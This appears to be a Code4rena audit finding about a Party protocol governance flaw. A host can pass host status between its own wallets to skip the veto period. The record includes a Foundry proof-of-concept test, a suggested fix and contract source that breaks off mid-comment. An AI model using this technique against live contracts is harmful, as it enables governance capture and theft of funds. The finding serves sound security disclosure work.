{
  "Title": "[H-02] Single host can unfairly skip veto period for proposal that does not have full host support",
  "Content": "\nAfter a proposal passes the vote threshold, there is a delay before it can be executed so that hosts get a chance to `veto` it if they wish. If all hosts voting in favour of the proposal, then this veto period is skipped.\n\nHowever, a single host can ensure the veto period is skipped even if no other hosts `accept` the proposal. The veto period is in place to prevent harmful/exploitative proposals from being executed, even if they are passed; therefore, a malicious/compromised host being able to skip the veto period can be seriously harmful to the protocol and its users. The [Tornado Cash governance hack](https://medium.com/coinmonks/tornado-cash-governance-hack-ec77ebb3aa68) from May 2023 is a relevant example, during which the attacker was able to steal around `$`1 million worth of assets.\n\nThis attack has a very low cost and a very high potential impact. If a malicious proposal is crafted in the same way used by the Tornado Cash attacker using hidden `CREATE2` and `SELFDESTRUCT` operations, then it is entirely feasible that it would meet the voting threshold, as many voters may not be savvy enough to spot the red flags.\n\n### Proof of Concept\n\n`PartyGovernance#abdicateHost` is a function that allows a host to renounce their host privileges, and transfer them to another address.\n\n```solidity\nFile: contracts\\party\\PartyGovernance.sol\n\n457:     /// @notice Transfer party host status to another.\n458:     /// @param newPartyHost The address of the new host.\n459:     function abdicateHost(address newPartyHost) external {\n460:         _assertHost();\n461:         // 0 is a special case burn address.\n462:         if (newPartyHost != address(0)) {\n463:             // Cannot transfer host status to an existing host.\n464:             if (isHost[newPartyHost]) {\n465:                 revert InvalidNewHostError();\n466:             }\n467:             isHost[newPartyHost] = true;\n468:         } else {\n469:             // Burned the host status\n470:             --numHosts;\n471:         }\n472:         isHost[msg.sender] = false;\n473:         emit HostStatusTransferred(msg.sender, newPartyHost);\n474:     }\n```\n\n<https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L457>\n\nThis can be done at any stage in the life cycle of a proposal. This means that a host can `accept` a proposal, incrementing the `numHostsAccepted` value for that proposal, then transfer the host status to another wallet that they control (that has non-zero voting power) and `accept` again, incrementing `numHostsAccepted` for a second time. This process can be repeated as many times as necessary until `numHostsAccepted` is equal to the total number of hosts `numHosts`. Once the proposal reaches the required vote threshold, the veto period will be skipped, despite only one host accepting.\n\nThe following foundry test shows the process described above. Copy and paste it into PartyGovernanceTest.t.sol to run.\n\n```solidity\n    function test_maliciousHost() public {\n        // Create users\n        PartyParticipant alice = new PartyParticipant();\n        PartyParticipant bob = new PartyParticipant();\n        PartyParticipant chad = new PartyParticipant();\n        PartyParticipant aliceAltWallet = new PartyParticipant();\n\n        // Create party\n        uint16 passThresholdBps = 5100;\n        (\n            Party party,\n            IERC721[] memory preciousTokens,\n            uint256[] memory preciousTokenIds\n        ) = partyAdmin.createParty(\n                partyImpl,\n                PartyAdmin.PartyCreationMinimalOptions({\n                    host1: address(alice),\n                    host2: address(bob),\n                    passThresholdBps: passThresholdBps,\n                    totalVotingPower: 151,\n                    preciousTokenAddress: address(toadz),\n                    preciousTokenId: 1,\n                    rageQuitTimestamp: 0,\n                    feeBps: 0,\n                    feeRecipient: payable(0)\n                })\n            );\n\n        // alice and bob are the only two hosts\n        assert(party.isHost(address(alice)));\n        assert(party.isHost(address(bob)));\n        assert(!party.isHost(address(chad)));\n        assert(!party.isHost(address(aliceAltWallet)));\n\n        // mint governance NFTs\n        partyAdmin.mintGovNft(party, address(alice), 50, address(alice));\n        partyAdmin.mintGovNft(party, address(bob), 50, address(bob));\n        partyAdmin.mintGovNft(party, address(chad), 50, address(chad));\n        partyAdmin.mintGovNft(party, address(aliceAltWallet), 1, address(aliceAltWallet));\n\n        // alice proposes a proposal\n        PartyGovernance.Proposal memory p1 = PartyGovernance.Proposal({\n            maxExecutableTime: 9999999999,\n            proposalData: abi.encodePacked([0]),\n            cancelDelay: uint40(1 days)\n        });\n        vm.roll(block.number + 1);\n        uint256 proposalId = alice.makeProposal(party, p1, 0);\n        \n        // chad accepts, but bob (the other host) does not\n        vm.roll(block.number + 1);\n        chad.vote(party, proposalId, 0);\n\n        // proposal meets vote threshold, but not all hosts have accepted\n        vm.roll(block.number + 1);\n        (\n            PartyGovernance.ProposalStatus status,\n            PartyGovernance.ProposalStateValues memory values\n        ) = party.getProposalStateInfo(proposalId);\n        assertEq(values.numHosts, 2);\n        assertEq(values.numHostsAccepted, 1);\n        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Passed)); // not Ready => veto period has not been skipped\n\n        // alice transfers host status to her other wallet address\n        vm.prank(address(alice));\n        vm.roll(block.number + 1);\n        party.abdicateHost(address(aliceAltWallet));\n\n        // alice accepts using her other wallet\n        vm.roll(block.number + 1);\n        aliceAltWallet.vote(party, proposalId, 0);\n\n        // veto is now skipped even though a host (bob) did not accept\n        vm.roll(block.number + 1);\n        (status, values) = party.getProposalStateInfo(proposalId);\n        assertEq(values.numHosts, 2);\n        assertEq(values.numHostsAccepted, 2);\n        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Ready)); // Ready for execution => veto period has now been skipped\n    }\n```\n\n### Recommended Mitigation Steps\n\nUtilise snapshots for hosts in a similar way to how `votingPower` is currently handled, so that `accept` only increments `numHostsAccepted` if the caller was a host at `proposedTime - 1`. This can be achieved under the current architecture in the following way:\n\n- Add a new `bool` member to the `VotingPowerSnapshot` struct named `isHost`.\n- Make `abdicateHost` save new snapshots to the `_votingPowerSnapshotsByVoter` mapping with the updated `isHost` values for the old and new hosts.\n- Replace the `isHost[msg.sender]` check in `accept` with a snapshot check, similar to how `getVotingPowerAt` is currently used.\n\n### Assessed type\n\nGovernance\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1817856780):**\n > Confirmed by sponsor [here](https://github.com/code-423n4/2023-10-party-findings/issues/538#issuecomment-1810898378).\n> Judging as high due to compromised governance.\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1821298504)**\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-party-findings/issues/233).*\n\n***\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-party",
  "Code": [
    {
      "filename": "contracts/party/PartyGovernance.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.20;\n\nimport { ITokenDistributor } from \"../distribution/ITokenDistributor.sol\";\nimport { ReadOnlyDelegateCall } from \"../utils/ReadOnlyDelegateCall.sol\";\nimport { IERC721 } from \"../tokens/IERC721.sol\";\nimport { IERC20 } from \"../tokens/IERC20.sol\";\nimport { IERC721Receiver } from \"../tokens/IERC721Receiver.sol\";\nimport { ERC1155TokenReceiverBase } from \"../vendor/solmate/ERC1155.sol\";\nimport { LibERC20Compat } from \"../utils/LibERC20Compat.sol\";\nimport { LibRawResult } from \"../utils/LibRawResult.sol\";\nimport { LibSafeCast } from \"../utils/LibSafeCast.sol\";\nimport { IERC4906 } from \"../utils/IERC4906.sol\";\nimport { IGlobals } from \"../globals/IGlobals.sol\";\nimport { LibGlobals } from \"../globals/LibGlobals.sol\";\nimport { IProposalExecutionEngine } from \"../proposals/IProposalExecutionEngine.sol\";\nimport { LibProposal } from \"../proposals/LibProposal.sol\";\nimport { ProposalStorage } from \"../proposals/ProposalStorage.sol\";\nimport { Implementation } from \"../utils/Implementation.sol\";\nimport { Party } from \"./Party.sol\";\n\n/// @notice Base contract for a Party encapsulating all governance functionality.\nabstract contract PartyGovernance is\n    ProposalStorage,\n    Implementation,\n    IERC4906,\n    ReadOnlyDelegateCall\n{\n    using LibERC20Compat for IERC20;\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibSafeCast for int192;\n    using LibSafeCast for uint96;\n\n    // States a proposal can be in.\n    enum ProposalStatus {\n        // The proposal does not exist.\n        Invalid,\n        // The proposal has been proposed (via `propose()`), has not been vetoed\n        // by a party host, and is within the voting window. Members can vote on\n        // the proposal and party hosts can veto the proposal.\n        Voting,\n        // The proposal has either exceeded its voting window without reaching\n        // `passThresholdBps` of votes or was vetoed by a party host.\n        Defeated,\n        // The proposal reached at least `passThresholdBps` of votes but is still\n        // waiting for `executionDelay` to pass before it can be executed. Members\n        // can continue to vote on the proposal and party hosts can veto at this time.\n        Passed,\n        // Same as `Passed` but now `executionDelay` has been satisfied. Any member\n        // may execute the proposal via `execute()`, unless `maxExecutableTime`\n        // has arrived.\n        Ready,\n        // The proposal has been executed at least once but has further steps to\n        // complete so it needs to be executed again. No other proposals may be\n        // executed while a proposal is in the `InProgress` state. No voting or\n        // vetoing of the proposal is allowed, however it may be forcibly cancelled\n        // via `cancel()` if the `cancelDelay` has passed since being first executed.\n        InProgress,\n        // The proposal was executed and completed all its steps. No voting or\n        // vetoing can occur and it cannot be cancelled nor executed again.\n        Complete,\n        // The proposal was executed at least once but did not complete before\n        // `cancelDelay` seconds passed since the first execute and was forcibly cancelled.\n        Cancelled\n    }\n\n    struct GovernanceOpts {\n        // Address of initial party hosts.\n        address[] hosts;\n        // How long people can vote on a proposal.\n        uint40 voteDuration;\n        // How long to wait after a proposal passes before it can be\n        // executed.\n        uint40 executionDelay;\n        // Minimum ratio of accept votes to consider a proposal passed,\n        // in bps, where 10,000 == 100%.\n        uint16 passThresholdBps;\n        // Total voting power of governance NFTs.\n        uint96 totalVotingPower;\n        // Fee bps for distributions.\n        uint16 feeBps;\n        // Fee recipeint for distributions.\n        address payable feeRecipient;\n    }\n\n    // A snapshot of voting power for a member.\n    struct VotingPowerSnapshot {\n        // The timestamp when the snapshot was taken.\n        uint40 timestamp;\n        // Voting power that was delegated to this user by others.\n        uint96 delegatedVotingPower;\n        // The intrinsic (not delegated from someone else) voting power of this user.\n        uint96 intrinsicVotingPower;\n        // Whether the user was delegated to another at this snapshot.\n        bool isDelegated;\n    }\n\n    // Proposal details chosen by proposer.\n    struct Proposal {\n        // Time beyond which the proposal can no longer be executed.\n        // If the proposal has already been executed, and is still InProgress,\n        // this value is ignored.\n        uint40 maxExecutableTime;\n        // The minimum seconds this proposal can remain in the InProgress status\n        // before it can be cancelled.\n        uint40 cancelDelay;\n        // Encoded proposal data. The first 4 bytes are the proposal type, followed\n        // by encoded proposal args specific to the proposal type. See\n        // ProposalExecutionEngine for details.\n        bytes proposalData;\n    }\n\n    // Accounting and state tracking values for a proposal.\n    struct ProposalStateValues {\n        // When the proposal was proposed.\n        uint40 proposedTime;\n        // When the proposal passed the vote.\n        uint40 passedTime;\n        // When the proposal was first executed.\n        uint40 executedTime;\n        // When the proposal completed.\n        uint40 completedTime;\n        // Number of accept votes.\n        uint96 votes; // -1 == vetoed\n        // Number of total voting power at time proposal created.\n        uint96 totalVotingPower;\n        /// @notice Number of hosts at time proposal created\n        uint8 numHosts;\n        /// @notice Number of hosts that accepted proposal\n        uint8 numHostsAccepted;\n    }\n\n    // Storage states for a proposal.\n    struct ProposalState {\n        // Accounting and state tracking values.\n        ProposalStateValues values;\n        // Hash of the proposal.\n        bytes32 hash;\n        // Whether a member has voted for (accepted) this proposal already.\n        mapping(address => bool) hasVoted;\n    }\n\n    event Proposed(uint256 proposalId, address proposer, Proposal proposal);\n    event ProposalAccepted(uint256 proposalId, address voter, uint256 weight);\n    event EmergencyExecute(address target, bytes data, uint256 amountEth);\n\n    event ProposalPassed(uint256 indexed proposalId);\n    event ProposalVetoed(uint256 indexed proposalId, address host);\n    event ProposalExecuted(uint256 indexed proposalId, address executor, bytes nextProgressData);\n    event ProposalCancelled(uint256 indexed proposalId);\n    event DistributionCreated(\n        ITokenDistributor.TokenType tokenType,\n        address token,\n        uint256 tokenId\n    );\n    event PartyDelegateUpdated(address indexed owner, address indexed delegate);\n    event HostStatusTransferred(address oldHost, address newHost);\n    event EmergencyExecuteDisabled();\n    event PartyVotingSnapshotCreated(\n        address indexed voter,\n        uint40 timestamp,\n        uint96 delegatedVotingPower,\n        uint96 intrinsicVotingPower,\n        bool isDelegated\n    );\n\n    error MismatchedPreciousListLengths();\n    error BadProposalStatusError(ProposalStatus status);\n    error BadProposalHashError(bytes32 proposalHash, bytes32 actualHash);\n    error ExecutionTimeExceededError(uint40 maxExecutableTime, uint40 timestamp);\n    error NotAuthorized();\n    error InvalidDelegateError();\n    error BadPreciousListError();\n    error OnlyWhenEmergencyActionsAllowedError();\n    error OnlyWhenEnabledError();\n    error AlreadyVotedError(address voter);\n    error InvalidNewHostError();\n    error ProposalCannotBeCancelledYetError(uint40 currentTime, uint40 cancelTime);\n    error InvalidBpsError(uint16 bps);\n    error DistributionsRequireVoteError();\n    error PartyNotStartedError();\n    error CannotRageQuitAndAcceptError();\n    error TooManyHosts();\n\n    uint256 private constant UINT40_HIGH_BIT = 1 << 39;\n    uint96 private constant VETO_VALUE = type(uint96).max;\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and itâ€™s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice Whether the DAO has emergency powers for this party.\n    bool public emergencyExecuteDisabled;\n    /// @notice Distribution fee bps.\n    uint16 public feeBps;\n    /// @notice Distribution fee recipient.\n    address payable public feeRecipient;\n    /// @notice The timestamp of the last time `rageQuit()` was called.\n    uint40 public lastRageQuitTimestamp;\n    /// @notice The hash of the list of precious NFTs guarded by the party.\n    bytes32 public preciousListHash;\n    /// @notice The last proposal ID that was used. 0 means no proposals have been made.\n    uint256 public lastProposalId;\n    /// @notice Whether an address is a party host.\n    mapping(address => bool) public isHost;\n    /// @notice The last person a voter delegated its voting power to.\n    mapping(address => address) public delegationsByVoter;\n    /// @notice Number of hosts for this party\n    uint8 public numHosts;\n    /// @notice ProposalState by proposal ID.\n    mapping(uint256 => ProposalState) private _proposalStateByProposalId;\n    /// @notice Snapshots of voting power per user, each sorted by increasing time.\n    mapping(address => VotingPowerSnapshot[]) private _votingPowerSnapshotsByVoter;\n\n    function _assertHost() internal view {\n        if (!isHost[msg.sender]) {\n            revert NotAuthorized();\n        }\n    }\n\n    function _assertActiveMember() internal view {\n        VotingPowerSnapshot memory snap = _getLastVotingPowerSnapshotForVoter(msg.sender);\n        // Must have either delegated voting power or intrinsic voting power.\n        if (snap.intrinsicVotingPower == 0 && snap.delegatedVotingPower == 0) {\n            revert NotAuthorized();\n        }\n    }\n\n    // Only the party DAO multisig can call.\n    modifier onlyPartyDao() {\n        {\n            address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n            if (msg.sender != partyDao) {\n                revert NotAuthorized();\n            }\n        }\n        _;\n    }\n\n    // Only the party DAO multisig or a party host can call.\n    modifier onlyPartyDaoOrHost() {\n        address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n        if (msg.sender != partyDao && !isHost[msg.sender]) {\n            revert NotAuthorized();\n        }\n        _;\n    }\n\n    // Only if `emergencyExecuteDisabled` is not true.\n    modifier onlyWhenEmergencyExecuteAllowed() {\n        if (emergencyExecuteDisabled) {\n            revert OnlyWhenEmergencyActionsAllowedError();\n        }\n        _;\n    }\n\n    function _assertNotGloballyDisabled() internal view {\n        if (_GLOBALS.getBool(LibGlobals.GLOBAL_DISABLE_PARTY_ACTIONS)) {\n            revert OnlyWhenEnabledError();\n        }\n    }\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) {\n        _GLOBALS = globals;\n    }\n\n    // Initialize storage for proxy contracts and initialize the proposal execution engine.\n    function _initialize(\n        GovernanceOpts memory govOpts,\n        ProposalStorage.ProposalEngineOpts memory proposalEngineOpts,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds\n    ) internal virtual {\n        // Check BPS are valid.\n        if (govOpts.feeBps > 1e4) {\n            revert InvalidBpsError(govOpts.feeBps);\n        }\n        if (govOpts.passThresholdBps > 1e4) {\n            revert InvalidBpsError(govOpts.passThresholdBps);\n        }\n        // Initialize the proposal execution engine.\n        _initProposalImpl(\n            IProposalExecutionEngine(_GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)),\n            abi.encode(proposalEngineOpts)\n        );\n        // Set the governance parameters.\n        _getSharedProposalStorage().governanceValues = GovernanceValues({\n            voteDuration: govOpts.voteDuration,\n            executionDelay: govOpts.executionDelay,\n            passThresholdBps: govOpts.passThresholdBps,\n            totalVotingPower: govOpts.totalVotingPower\n        });\n        numHosts = uint8(govOpts.hosts.length);\n        // Set fees.\n        feeBps = govOpts.feeBps;\n        feeRecipient = govOpts.feeRecipient;\n        // Set the precious list.\n        _setPreciousList(preciousTokens, preciousTokenIds);\n        // Set the party hosts.\n        if (govOpts.hosts.length > type(uint8).max) {\n            revert TooManyHosts();\n        }\n        for (uint256 i = 0; i < govOpts.hosts.length; ++i) {\n            isHost[govOpts.hosts[i]] = true;\n        }\n    }\n\n    /// @dev Forward all unknown read-only calls to the proposal execution engine.\n    ///      Initial use case is to facilitate eip-1271 signatures.\n    fallback() external {\n        bytes4 functionSelector = bytes4(msg.data[0:4]);\n        if (\n            functionSelector == ERC1155TokenReceiverBase.onERC1155BatchReceived.selector ||\n            functionSelector == ERC1155TokenReceiverBase.onERC1155Received.selector ||\n            functionSelector == IERC721Receiver.onERC721Received.selector\n        ) {\n            assembly {\n                let freeMem := mload(0x40)\n                mstore(freeMem, functionSelector)\n                mstore(0x40, add(freeMem, 0x20))\n                return(freeMem, 0x20)\n            }\n        }\n        _readOnlyDelegateCall(address(_getSharedProposalStorage().engineImpl), msg.data);\n    }\n\n    /// @notice Query if a contract implements an interface.\n    /// @param interfaceId The interface identifier, as specified in ERC-165\n    /// @return `true` if the contract implements `interfaceId` and\n    ///         `interfaceId` is not 0xffffffff, `false` otherwise\n    function supportsInterface(bytes4 interfaceId) public pure virtual returns (bool) {\n        return\n            interfaceId == type(IERC721Receiver).interfaceId ||\n            interfaceId == type(ERC1155TokenReceiverBase).interfaceId ||\n            // ERC4906 interface ID\n            interfaceId == 0x49064906;\n    }\n\n    /// @notice Get the current `ProposalExecutionEngine` instance.\n    function getProposalExecutionEngine() external view returns (IProposalExecutionEngine) {\n        return _getSharedProposalStorage().engineImpl;\n    }\n\n    /// @notice Get the current `ProposalEngineOpts` options.\n    function getProposalEngineOpts() external view returns (ProposalEngineOpts memory) {\n        return _getSharedProposalStorage().opts;\n    }\n\n    /// @notice Get the total voting power of `voter` at a `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(\n        address voter,\n        uint40 timestamp\n    ) external view returns (uint96 votingPower) {\n        return getVotingPowerAt(voter, timestamp, type(uint256).max);\n    }\n\n    /// @notice Get the total voting power of `voter` at a snapshot `snapIndex`, with checks to\n    ///         make sure it is the latest voting snapshot =< `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @param snapIndex The index of the snapshot to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(\n        address voter,\n        uint40 timestamp,\n        uint256 snapIndex\n    ) public view returns (uint96 votingPower) {\n        VotingPowerSnapshot memory snap = _getVotingPowerSnapshotAt(voter, timestamp, snapIndex);\n        return (snap.isDelegated ? 0 : snap.intrinsicVotingPower) + snap.delegatedVotingPower;\n    }\n\n    /// @notice Get the state of a proposal.\n    /// @param proposalId The ID of the proposal.\n    /// @return status The status of the proposal.\n    /// @return values The state of the proposal.\n    function getProposalStateInfo(\n        uint256 proposalId\n    ) external view returns (ProposalStatus status, ProposalStateValues memory values) {\n        values = _proposalStateByProposalId[proposalId].values;\n        status = _getProposalStatus(values);\n    }\n\n    /// @notice Retrieve fixed governance parameters.\n    /// @return gv The governance parameters of this party.\n    function getGovernanceValues() external view returns (GovernanceValues memory) {\n        return _getSharedProposalStorage().governanceValues;\n    }\n\n    /// @notice Get the hash of a proposal.\n    /// @dev Proposal details are not stored on-chain so the hash is used to enforce\n    ///      consistency between calls.\n    /// @param proposal The proposal to hash.\n    /// @return proposalHash The hash of the proposal.\n    function getProposalHash(Proposal memory proposal) public pure returns (bytes32 proposalHash) {\n        // Hash the proposal in-place. Equivalent to:\n        // keccak256(abi.encode(\n        //   proposal.maxExecutableTime,\n        //   proposal.cancelDelay,\n        //   keccak256(proposal.proposalData)\n        // ))\n        bytes32 dataHash = keccak256(proposal.proposalData);\n        assembly {\n            // Overwrite the data field with the hash of its contents and then\n            // hash the struct.\n            let dataPos := add(proposal, 0x40)\n            let t := mload(dataPos)\n            mstore(dataPos, dataHash)\n            proposalHash := keccak256(proposal, 0x60)\n            // Restore the data field.\n            mstore(dataPos, t)\n        }\n    }\n\n    /// @notice Get the index of the most recent voting power snapshot <= `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the snapshot index at.\n    /// @return index The index of the snapshot.\n    function findVotingPowerSnapshotIndex(\n        address voter,\n        uint40 timestamp\n    ) public view returns (uint256 index) {\n        VotingPowerSnapshot[] storage snaps = _votingPowerSnapshotsByVoter[voter];\n\n        // Derived from Open Zeppelin binary search\n        // ref: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Checkpoints.sol#L39\n        uint256 high = snaps.length;\n        uint256 low = 0;\n        while (low < high) {\n            uint256 mid = (low + high) / 2;\n            if (snaps[mid].timestamp > timestamp) {\n                // Entry is too recent.\n                high = mid;\n            } else {\n                // Entry is older. This is our best guess for now.\n                low = mid + 1;\n            }\n        }\n\n        // Return `type(uint256).max` if no valid voting snapshots found.\n        return high == 0 ? type(uint256).max : high - 1;\n    }\n\n    /// @notice Pledge your intrinsic voting power to a new delegate, removing it from\n    ///         the old one (if any).\n    /// @param delegate The address to delegating voting power to.\n    function delegateVotingPower(address delegate) external {\n        _adjustVotingPower(msg.sender, 0, delegate);\n    }\n\n    /// @notice Transfer party host status to another.\n    /// @param newPartyHost The address of the new host.\n    function abdicateHost(address newPartyHost) external {\n        _assertHost();\n        // 0 is a special case burn address.\n        if (newPartyHost != address(0)) {\n            // Cannot transfer host status to an existing host.\n            if (isHost[newPartyHost]) {\n                revert InvalidNewHostError();\n            }\n            isHost[newPartyHost] = true;\n        } else {\n            // Burned the host status\n            --numHosts;\n        }\n        isHost[msg.sender] = false;\n        emit HostStatusTransferred(msg.sender, newPartyHost);\n    }\n\n    /// @notice Create a token distribution by moving the party's entire balance\n    ///         to the `TokenDistributor` contract and immediately creating a\n    ///         distribution governed by this party.\n    /// @dev The `feeBps` and `feeRecipient` this party was created with will be\n    ///      propagated to the distribution. Party members are entitled to a\n    ///      share of the distribution's tokens proportionate to their relative\n    ///      voting power in this party (less the fee).\n    /// @dev Allow this to be called by the party itself for `FractionalizeProposal`.\n    /// @param tokenType The type of token to distribute.\n    /// @param token The address of the token to distribute.\n    /// @param tokenId The ID of the token to distribute. Currently unused but\n    ///                may be used in the future to support other distribution types.\n    /// @return distInfo The information about the created distribution.\n    function distribute(\n        uint256 amount,\n        ITokenDistributor.TokenType tokenType,\n        address token,\n        uint256 tokenId\n    ) external returns (ITokenDistributor.DistributionInfo memory distInfo) {\n        _assertNotGloballyDisabled();\n        // Ignore if the party is calling functions on itself, like with\n        // `FractionalizeProposal` and `DistributionProposal`.\n        if (msg.sender != address(this)) {\n            // Must not require a vote to create a distribution, otherwise\n            // distributions can only be created through a distribution\n            // proposal.\n            if (_getSharedProposalStorage().opts.distributionsRequireVote) {\n                revert DistributionsRequireVoteError();\n            }\n            // Must be an active member.\n            VotingPowerSnapshot memory snap = _getLastVotingPowerSnapshotForVoter(msg.sender);\n            if (snap.intrinsicVotingPower == 0 && snap.delegatedVotingPower == 0) {\n                revert NotAuthorized();\n            }\n        }\n        // Prevent creating a distribution if the party has not started.\n        if (_getSharedProposalStorage().governanceValues.totalVotingPower == 0) {\n            revert PartyNotStartedError();\n        }\n        // Get the address of the token distributor.\n        ITokenDistributor distributor = ITokenDistributor(\n            _GLOBALS.getAddress(LibGlobals.GLOBAL_TOKEN_DISTRIBUTOR)\n        );\n        emit DistributionCreated(tokenType, token, tokenId);\n        // Notify third-party platforms that the governance NFT metadata has\n        // updated for all tokens.\n        emit BatchMetadataUpdate(0, type(uint256).max);\n        // Create a native token distribution.\n        address payable feeRecipient_ = feeRecipient;\n        uint16 feeBps_ = feeBps;\n        if (tokenType == ITokenDistributor.TokenType.Native) {\n            return\n                distributor.createNativeDistribution{ value: amount }(\n                    Party(payable(address(this))),\n                    feeRecipient_,\n                    feeBps_\n                );\n        }\n        // Otherwise must be an ERC20 token distribution.\n        assert(tokenType == ITokenDistributor.TokenType.Erc20);\n        IERC20(token).compatTransfer(address(distributor), amount);\n        return\n            distributor.createErc20Distribution(\n                IERC20(token),\n                Party(payable(address(this))),\n                feeRecipient_,\n                feeBps_\n            );\n    }\n\n    /// @notice Make a proposal for members to vote on and cast a vote to accept it\n    ///         as well.\n    /// @dev Only an active member (has voting power) can call this.\n    ///      Afterwards, members can vote to support it with `accept()` or a party\n    ///      host can unilaterally reject the proposal with `veto()`.\n    /// @param proposal The details of the proposal.\n    /// @param latestSnapIndex The index of the caller's most recent voting power\n    ///                        snapshot before the proposal was created. Should\n    ///                        be retrieved off-chain and passed in.\n    function propose(\n        Proposal memory proposal,\n        uint256 latestSnapIndex\n    ) external returns (uint256 proposalId) {\n        _assertActiveMember();\n        proposalId = ++lastProposalId;\n        // Store the time the proposal was created and the proposal hash.\n        (\n            _proposalStateByProposalId[proposalId].values,\n            _proposalStateByProposalId[proposalId].hash\n        ) = (\n            ProposalStateValues({\n                proposedTime: uint40(block.timestamp),\n                passedTime: 0,\n                executedTime: 0,\n                completedTime: 0,\n                votes: 0,\n                totalVotingPower: _getSharedProposalStorage().governanceValues.totalVotingPower,\n                numHosts: numHosts,\n                numHostsAccepted: 0\n            }),\n            getProposalHash(proposal)\n        );\n        emit Proposed(proposalId, msg.sender, proposal);\n        accept(proposalId, latestSnapIndex);\n\n        // Notify third-party platforms that the governance NFT metadata has\n        // updated for all tokens.\n        emit BatchMetadataUpdate(0, type(uint256).max);\n    }\n\n    /// @notice Vote to support a proposed proposal.\n    /// @dev The voting power cast will be the effective voting power of the caller\n    ///      just before `propose()` was called (see `getVotingPowerAt()`).\n    ///      If the proposal reaches `passThresholdBps` acceptance ratio then the\n    ///      proposal will be in the `Passed` state and will be executable after\n    ///      the `executionDelay` has passed, putting it in the `Ready` state.\n    /// @param proposalId The ID of the proposal to accept.\n    /// @param snapIndex The index of the caller's last voting power snapshot\n    ///                  before the proposal was created. Should be retrieved\n    ///                  off-chain and passed in.\n    /// @return totalVotes The total votes cast on the proposal.\n    function accept(uint256 proposalId, uint256 snapIndex) public returns (uint256 totalVotes) {\n        // Get the information about the proposal.\n        ProposalState storage info = _proposalStateByProposalId[proposalId];\n        ProposalStateValues memory values = info.values;\n\n        // Can only vote in certain proposal statuses.\n        {\n            ProposalStatus status = _getProposalStatus(values);\n            // Allow voting even if the proposal is passed/ready so it can\n            // potentially reach 100% consensus, which unlocks special\n            // behaviors for certain proposal types.\n            if (\n                status != ProposalStatus.Voting &&\n                status != ProposalStatus.Passed &&\n                status != ProposalStatus.Ready\n            ) {\n                revert BadProposalStatusError(status);\n            }\n        }\n\n        // Prevent voting in the same block as the last rage quit timestamp.\n        // This is to prevent an exploit where a member can rage quit to reduce\n        // the total voting power of the party, then propose and vote in the\n        // same block since `getVotingPowerAt()` uses `values.proposedTime - 1`.\n        // This would allow them to use the voting power snapshot just before\n        // their card was burned to vote, potentially passing a proposal that\n        // would have otherwise not passed.\n        if (lastRageQuitTimestamp == block.timestamp) {\n            revert CannotRageQuitAndAcceptError();\n        }\n\n        // Cannot vote twice.\n        if (info.hasVoted[msg.sender]) {\n            revert AlreadyVotedError(msg.sender);\n        }\n        // Mark the caller as having voted.\n        info.hasVoted[msg.sender] = true;\n\n        // Increase the total votes that have been cast on this proposal.\n        uint96 votingPower = getVotingPowerAt(msg.sender, values.proposedTime - 1, snapIndex);\n        values.votes += votingPower;\n        if (isHost[msg.sender]) {\n            ++values.numHostsAccepted;\n        }\n        info.values = values;\n        emit ProposalAccepted(proposalId, msg.sender, votingPower);\n\n        // Update the proposal status if it has reached the pass threshold.\n        if (\n            values.passedTime == 0 &&\n            _areVotesPassing(\n                values.votes,\n                values.totalVotingPower,\n                _getSharedProposalStorage().governanceValues.passThresholdBps\n            )\n        ) {\n            info.values.passedTime = uint40(block.timestamp);\n            emit ProposalPassed(proposalId);\n            // Notify third-party platforms that the governance NFT metadata has\n            // updated for all tokens.\n            emit BatchMetadataUpdate(0, type(uint256).max);\n        }\n        return values.votes;\n    }\n\n    /// @notice As a party host, veto a proposal, unilaterally rejecting it.\n    /// @dev The proposal will never be executable and cannot be voted on anymore.\n    ///      A proposal that has been already executed at least once (in the `InProgress` status)\n    ///      cannot be vetoed.\n    /// @param proposalId The ID of the proposal to veto.\n    function veto(uint256 proposalId) external {\n        _assertHost();\n        // Setting `votes` to -1 indicates a veto.\n        ProposalState storage info = _proposalStateByProposalId[proposalId];\n        ProposalStateValues memory values = info.values;\n\n        {\n            ProposalStatus status = _getProposalStatus(values);\n            // Proposal must be in one of the following states.\n            if (\n                status != ProposalStatus.Voting &&\n                status != ProposalStatus.Passed &&\n                status != ProposalStatus.Ready\n            ) {\n                revert BadProposalStatusError(status);\n            }\n        }\n\n        // -1 indicates veto.\n        info.values.votes = VETO_VALUE;\n        emit ProposalVetoed(proposalId, msg.sender);\n        // Notify third-party platforms that the governance NFT metadata has\n        // updated for all tokens.\n        emit BatchMetadataUpdate(0, type(uint256).max);\n    }\n\n    /// @notice Executes a proposal that has passed governance.\n    /// @dev The proposal must be in the `Ready` or `InProgress` status.\n    ///      A `ProposalExecuted` event will be emitted with a non-empty `nextProgressData`\n    ///      if the proposal has extra steps (must be executed again) to carry out,\n    ///      in which case `nextProgressData` should be passed into the next `execute()` call.\n    ///      The 